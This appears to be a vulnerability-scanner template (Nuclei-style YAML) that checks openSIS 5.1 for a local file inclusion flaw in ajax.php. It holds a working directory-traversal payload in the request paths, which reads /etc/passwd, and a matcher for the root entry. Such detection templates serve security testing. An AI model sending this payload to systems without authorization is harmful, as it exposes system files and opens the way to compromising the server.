id: opensis-lfi
info:
  author: pikpikcu
  description: An attacker can exploit a vulnerability in openSIS to obtain potentially
    sensitive information and execute arbitrary local scripts in the context of the
    Web server process. This may allow the attacker to compromise the application
    and computer; other attacks are also possible.
  name: openSIS 5.1 - 'ajax.php' Local File Inclusion
  reference:
  - https://www.exploit-db.com/exploits/38039
  severity: high
  tags: opensis,lfi
requests:
- matchers:
  - regex:
    - root:[x*]:0:0
    type: regex
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/opensis/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
  - '{{BaseURL}}/ajax.php?modname=misc/../../../../../../../../../../../../../etc/passwd&bypass=Transcripts.php'
